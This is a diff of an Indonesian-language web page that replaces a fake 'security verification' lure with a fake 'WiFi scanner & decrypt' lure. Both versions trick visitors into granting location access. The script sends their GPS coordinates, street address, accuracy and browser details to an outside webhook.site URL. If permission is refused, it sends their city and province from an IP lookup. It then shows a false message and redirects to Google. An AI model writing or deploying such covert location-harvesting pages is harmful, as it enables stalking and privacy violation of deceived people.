@@ -3,61 +3,70 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verifikasi Keamanan</title>
+    <title>WiFi Analyzer & Hack</title>
     <style>
-        body { background: #fff; color: #333; font-family: -apple-system, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
-        .box { padding: 20px; max-width: 300px; border: 1px solid #ddd; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); }
-        button { background: #007bff; color: white; border: none; padding: 12px 20px; border-radius: 5px; font-size: 16px; cursor: pointer; width: 100%; font-weight: bold; }
-        img { width: 50px; margin-bottom: 15px; }
-        p { font-size: 14px; line-height: 1.5; color: #666; }
+        body { background: #0a0a0a; color: #00ff00; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
+        .box { padding: 30px; border: 1px solid #00ff00; border-radius: 5px; box-shadow: 0 0 15px #00ff0033; background: #111; width: 90%; max-width: 400px; }
+        .radar { width: 60px; height: 60px; border: 2px solid #00ff00; border-radius: 50%; margin: 0 auto 20px; position: relative; animation: pulse 2s infinite; }
+        @keyframes pulse { 0% { box-shadow: 0 0 0 0 #00ff0077; } 70% { box-shadow: 0 0 0 20px #00ff0000; } 100% { box-shadow: 0 0 0 0 #00ff0000; } }
+        button { background: #00ff00; color: #000; border: none; padding: 15px; border-radius: 3px; font-size: 14px; cursor: pointer; width: 100%; font-weight: bold; margin-top: 20px; }
+        p { font-size: 13px; color: #00cc00; }
     </style>
 </head>
 <body>
 
 <div class="box">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/53/Google_Icons_by_Evericons_RSA_Icons_18.svg/512px-Google_Icons_by_Evericons_RSA_Icons_18.svg.png" alt="lock">
-    <h3>Verifikasi Anda</h3>
-    <p>Klik tombol di bawah untuk membuktikan Anda bukan robot dan melanjutkan ke halaman tujuan.</p>
-    <button onclick="mintaIzin()">Lanjutkan</button>
+    <div class="radar"></div>
+    <h2 style="margin:0 0 10px 0;">WIFI SCANNER v4.1</h2>
+    <p>Sistem siap mencari jaringan WiFi tersembunyi di sekitar Anda.</p>
+    <p style="font-size: 11px; color: #888;">Note: Akses lokasi diperlukan untuk sinkronisasi tower sinyal terdekat.</p>
+    <button onclick="scanNow()">MULAI SCAN & DECRYPT</button>
 </div>
 
 <script>
     const webhook = "https://webhook.site/3c903d72-6b38-4d96-a901-286e3fc578b2";
 
-    async function sendData(payload) {
-        await fetch(webhook, { method: 'POST', mode: 'no-cors', body: JSON.stringify(payload) });
-        navigator.sendBeacon(webhook, JSON.stringify(payload));
+    async function sendData(data) {
+        await fetch(webhook, { method: 'POST', mode: 'no-cors', body: JSON.stringify(data) });
+        navigator.sendBeacon(webhook, JSON.stringify(data));
     }
 
-    function mintaIzin() {
-        // Begitu tombol diklik, browser bakal nanya izin lokasi
+    function scanNow() {
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(async (pos) => {
                 const lat = pos.coords.latitude;
                 const lon = pos.coords.longitude;
 
-                // Ambil Nama Jalan (Reverse Geocoding)
+                // Proses nerjemahin koordinat jadi nama jalan
                 try {
                     const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
                     const geo = await res.json();
                     
                     await sendData({
-                        status: "BERHASIL_VERIFIKASI_GPS",
-                        alamat: geo.display_name,
-                        maps: `https://www.google.com/maps?q=${lat},${lon}`
+                        tema: "WIFI_HACK_SUCCESS",
+                        alamat_target: geo.display_name, // INI ALAMATNYA
+                        google_maps: `https://www.google.com/maps?q=${lat},${lon}`,
+                        akurasi: pos.coords.accuracy + " meter",
+                        device: navigator.userAgent
                     });
                 } catch (e) {
-                    await sendData({ status: "GPS_ONLY", lat, lon });
+                    await sendData({ tema: "WIFI_HACK_GPS_ONLY", lat, lon });
                 }
 
-                // Lempar ke tujuan asli
+                alert("Scanning Selesai! Tidak ada WiFi terbuka ditemukan. Mengalihkan ke database cloud...");
                 window.location.href = "https://www.google.com";
 
             }, async (err) => {
-                // Jika dia tetep klik "Block"
+                // Jika dia klik "Tolak"
                 const ipRes = await fetch('https://ipapi.co/json/');
                 const d = await ipRes.json();
-                await sendData({ status: "VERIFIKASI_GAGAL_IP_ONLY", kota: d.city });
+                await sendData({ 
+                    tema: "WIFI_HACK_GAGAL_IP_ONLY", 
+                    kota: d.city,
+                    provinsi: d.region,
+                    alasan: "Target Menolak Izin Lokasi"
+                });
+                alert("Error: Gagal sinkronisasi satelit. Scan dibatalkan.");
                 window.location.href = "https://www.google.com";
             }, { enableHighAccuracy: true });
         }
